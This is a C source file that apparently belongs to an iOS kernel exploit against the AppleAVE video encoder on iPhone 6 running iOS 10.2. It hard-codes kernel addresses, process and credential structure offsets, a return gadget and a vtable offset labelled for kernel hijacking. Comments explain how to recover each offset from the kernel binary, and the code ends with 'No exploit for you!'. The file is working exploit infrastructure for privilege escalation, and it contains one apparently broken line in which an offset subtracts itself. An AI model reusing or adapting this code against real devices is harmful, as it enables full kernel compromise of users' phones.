#include "offsets.h"
#include "log.h"

#include <stdio.h>
#include <stdlib.h>
#include <strings.h>
#include <sys/utsname.h>
#include <errno.h>
#import <sys/sysctl.h>    

static offsets_t g_offsets;
static void * g_kernel_base = NULL;


/*
 * Function name: 	offsets_get_kernel_base
 * Description:		Gets the kernel base.
 * Returns:			void *.
 */

void * offsets_get_kernel_base() {
	
	return g_kernel_base;
}

/*
 * Function name: 	offsets_set_kernel_base
 * Description:		Sets the kernel base.
 * Returns:			void.
 */

void offsets_set_kernel_base(void * kernel_base) {
	
	g_kernel_base = kernel_base;
}




/*
 * Function name: 	offsets_get_offsets
 * Description:		Gets the main offsets object.
 * Returns:			offsets_t.
 */

offsets_t offsets_get_offsets() {
	
	return g_offsets;
}



typedef void (*init_func)(void);

void init_iphone_6_14c92() {

	g_offsets.kernel_base = 0xFFFFFFF0060CC000;

	/*
		Find the string "AVE ERROR: SetSessionSettings chroma_format_idc = %d."
		There's only one usage. The branch is being called from the same place.
		There's a check whether 0 <= chroma <= 4, Taken from *(X19 + W8)
		The only call from that branch is just below a lot of memcpys.

		Let's say that W8 is 0x4AD0 (our case for that symbol).
		We see that there's a memcpy(X19 + 0x4AA8, X27 + 0x3B70, 0x5AC)
		Our chroma offset falls within that memcpy.
		So if 0x4AD0 is the chroma offset, 0x4AD0 - 0x4AA8 == 0x28.
		The memcpy from our controlled input starts at 0x3B70 in that case.
		Therefore the chroma format offset is 0x3B70 + 0x28.
	*/
	g_offsets.encode_frame_offset_chroma_format_idc = (0x3B70+0x28);

	/*
		The same as before goes here, ui32Width is being checked, it has to be > 0xC0
		It just checked just slightly after the chroma format IDC check.
		We see that the memcpy that is responsible for copying ui32Width looks like that:
		memcpy(X19 + 0x194C, X27 + 0xA14)
		X28 is ui32Width in our case, which is X19 + 0x194C.
		Therefore 0xA14 is ui32Width in our case
	*/
	g_offsets.encode_frame_offset_ui32_width = (0xA10+4);

	/*
		Just the same explanation as before, but instead of 0x194C, 0x1950 is being checked.
		Hence we just increase by 4, because it is being copied by the same memcpy as before.
	*/
	g_offsets.encode_frame_offset_ui32_height = (0xA10+8);

	/*
		Pretty much the same like before. String reference is "AVE ERROR: SlicesPerFrame  = %d" this time.
		Slices per frame is being checked at offset 0x1CC0.
		The responsible memcpy is memcpy(X19 + 0x1C90, X27 + 0xD58, 0x2E18)
		0x1CC0 - 0x1C90 == 0x30.
		It starts to be copied from our input buffer at offset 0xD58.
		Hence the offset, 0xD58(where our input buffer is being copied) + 0x30(offset from copied dest starting point)
	*/
	g_offsets.encode_frame_offset_slice_per_frame = (0xD58+0x30);

	/*
 		I don't think it's ever going to change..
	*/
	g_offsets.encode_frame_offset_info_type = (0x10);

	/*
		There are 2 usages of the following string:
		"AVE WARNING: m_PoweredDownWithClientsStillRegistered = true - ask to reset, the HW is in a bad state..."
		One just slightly above an IOMalloc(0x28), one somewhere else.
		Go to the one above the IOMalloc.
		Above the IOMalloc there's something that looks like the following:
			LDR             X0, [X23,#0x11D8]
			CBNZ            X0, somewhere
			MOV             W0, #0x28
			BL              _IOMalloc
			STR             X0, [X23,#0x11D8]

		The offset is where the IOMalloc put its allocated address.
	*/
	g_offsets.encode_frame_offset_iosurface_buffer_mgr = (0x11D8);

	/*
	    Find the following string:
	    "AVE ERROR: IMG_V_EncodeAndSendFrame multiPassEndPassCounterEnc (%d) >= H264VIDEOENCODER_MULTI_PASS_PASSES\n"
	    That's the check that, if not passed, leads to the print of that string:
	    	LDR             W25, [X22,#0xC]
	    	CMP             W25, #2
	    	B.CC            somewhere

	    The offset from X22 is what we should put here.
	*/
	g_offsets.kernel_address_multipass_end_pass_counter_enc = (0xC);

	/*
		There's a string "inputYUV" which is being used twice.
		One time, just above _mach_absolute_time, one time somewhere else.
		Above it, we see the following:
			MOV             W8, #0x4A88
			LDRB            W7, [X19,X8]

		Just like before, the X19 is from our memcpy, so we see that the responsible memcpy is:
		memcpy(X19 + 0x1C90, X27 + 0xD58, 0x2E18)

		So 0x4A88 - 0x1C90 == 0x2DF8
		So 0x2DF8 + 0xD58(that's where they start copying from our input buffer) == 0x3B50.
	*/
	g_offsets.encode_frame_offset_keep_cache = (0x3B50);

	/* Vtable address of IOSurface */

	g_offsets.iofence_vtable_offset = 0xFFFFFFF006EF4B08 - g_offsets.kernel_base;

	/* IOFence current fences list head in the IOSurface object */

	g_offsets.iosurface_current_fences_list_head = 0x210;

	g_offsets.panic = 0xFFFFFFF0070B6DD0 - g_offsets.kernel_base;

	g_offsets.osserializer_serialize = 0xFFFFFFF00745B0DC - g_offsets.kernel_base;

	g_offsets.copyin = 0xFFFFFFF00718F748 - g_offsets.kernel_base;

	g_offsets.copyout = 0xFFFFFFF00718F950 - g_offsets.kernel_base;

	g_offsets.all_proc = 0xfffffff0075bc468 - g_offsets.kernel_base;

	g_offsets.kern_proc = 0xFFFFFFF0075C20E0 - g_offsets.kernel_base;

	g_offsets.l1dcachesize_handler = 0xFFFFFFF00753A628 - g_offsets.kernel_base;

	g_offsets.l1dcachesize_string = 0xFFFFFFF007057890 - g_offsets.kernel_base;

	g_offsets.l1icachesize_string = 0xFFFFFFF007057883 - g_offsets.kernel_base;

	g_offsets.quad_format_string = 0xFFFFFFF007069601 - g_offsets.quad_format_string;

	g_offsets.null_terminator = 0xFFFFFFF00706A407 - g_offsets.kernel_base;

	g_offsets.cachesize_callback = 0xFFFFFFF0073BE284 - g_offsets.kernel_base;

	g_offsets.sysctl_hw_family = 0xFFFFFFF00753A678 - g_offsets.kernel_base;

	g_offsets.ret_gadget = 0xFFFFFFF0070B55B8 - g_offsets.kernel_base;

	g_offsets.struct_proc_p_comm = 0x26C;

	g_offsets.struct_proc_p_ucred = 0x100;

	g_offsets.struct_kauth_cred_cr_ref = 0x10;

	g_offsets.struct_proc_p_uthlist = 0x98;

	g_offsets.struct_uthread_uu_ucred = 0x168;
	
    g_offsets.struct_uthread_uu_list = 0x170;

    /* 
    	IOSurface->lockSurface 
    	Find "H264IOSurfaceBuf ERROR: lockSurface failed."
    	Both strings have BLR X8 above them.
    	Find the nearest LDR X8, [something, OFFSET].
    	The OFFSET is mostly 0x98. If something else, then change this.
    */
    g_offsets.iosurface_vtable_offset_kernel_hijack = 0x98;

}

/*
 * Function name: 	offsets_get_os_build_version
 * Description:		Gets a string with the OS's build version.
 * Returns:			kern_return_t and os build version in output param.
 */

static
kern_return_t offsets_get_os_build_version(char * os_build_version) {
	
	kern_return_t ret = KERN_SUCCESS;
	int mib[2] = {CTL_KERN, KERN_OSVERSION};
	uint32_t namelen = sizeof(mib) / sizeof(mib[0]);
	size_t buffer_size = 0;
	char * errno_str = NULL;

	ret = sysctl(mib, namelen, NULL, &buffer_size, NULL, 0);
	if (KERN_SUCCESS != ret)
	{
		errno_str = strerror(errno);
		ERROR_LOG("error getting OS version's buffer size: %s", errno_str);
		goto cleanup;
	}

	ret = sysctl(mib, namelen, os_build_version, &buffer_size, NULL, 0);
	if (KERN_SUCCESS != ret)
	{
		errno_str = strerror(errno);
		ERROR_LOG("Error getting OS version: %s", errno_str);	
		goto cleanup;
	}

cleanup:
	return ret;
}

/*
 * Function name: 	offsets_get_device_type_and_version
 * Description:		Gets the device type and version.
 * Returns:			kern_return_t and data in output params.
 */

static
kern_return_t offsets_get_device_type_and_version(char * machine, char * build) {
	
	kern_return_t ret = KERN_SUCCESS;
	struct utsname u;
	char os_build_version[0x100] = {0};

	memset(&u, 0, sizeof(u));

	ret = uname(&u);
	if (ret)
	{
		ERROR_LOG("Error uname-ing");
		goto cleanup;
	}

	ret = offsets_get_os_build_version(os_build_version);
	if (KERN_SUCCESS != ret)
	{
		ERROR_LOG("Error getting OS Build version!");
		goto cleanup;
	}

	strcpy(machine, u.machine);
	strcpy(build, os_build_version);

cleanup:
	return ret;
}


/*
 * Function name: 	offsets_determine_initializer_for_device_and_build
 * Description:		Determines which function should be used as an initializer for the device and build given.
 * Returns:			kern_return_t and func pointer as an output param.
 */

static
kern_return_t offsets_determine_initializer_for_device_and_build(char * device, char * build, init_func * func) {
	
	kern_return_t ret = KERN_INVALID_HOST;

	if (strstr(device, "iPhone7,2"))
	{
		DEBUG_LOG("Detected iPhone 6");
		if (strstr(build, "14C92"))
		{
			DEBUG_LOG("Initializing for iOS 10.2");
			*func = (init_func)init_iphone_6_14c92;
			ret = KERN_SUCCESS;
		}
		else {
			ERROR_LOG("Unsupported phone version. quitting.");
			goto cleanup;
		}
	} else {
		ERROR_LOG("Unsupported device. quitting.");
		goto cleanup;
	}

cleanup:
	return ret;
}




/*
 * Function name: 	offsets_get_init_func
 * Description:		Determines which initialization function should be used for the current build.
 * Returns:			kern_return_t and function pointer in output params.
 */

static
kern_return_t offsets_get_init_func(init_func * func) {
	
	kern_return_t ret = KERN_SUCCESS;

	char machine[0x100] = {0};
	char build[0x100] = {0};

	ret = offsets_get_device_type_and_version(machine, build);
	if (KERN_SUCCESS != ret)
	{
		ERROR_LOG("Error getting device type and build version");
		goto cleanup;
	}

	DEBUG_LOG("machine: %s", machine);
	DEBUG_LOG("build: %s", build);

	ret = offsets_determine_initializer_for_device_and_build(machine, build, func);
	if (KERN_SUCCESS != ret)
	{
		ERROR_LOG("Error finding the appropriate function loader for the specific host");
		goto cleanup;
	}


cleanup:
	return ret;
}




/*
 * Function name: 	offsets_init
 * Description:		Initializes offsets for the current build running.
 * Returns:			int - zero for success, otherwise non-zero.
 */

kern_return_t offsets_init() {
	
	kern_return_t ret = 0;
	init_func func = NULL;

	memset(&g_offsets, 0, sizeof(g_offsets));

	ret = offsets_get_init_func(&func);
	if (KERN_SUCCESS != ret)
	{
		ERROR_LOG("Error initializing offsets. No exploit for you!");
		goto cleanup;
	}

	func();

cleanup:
	return ret;
}

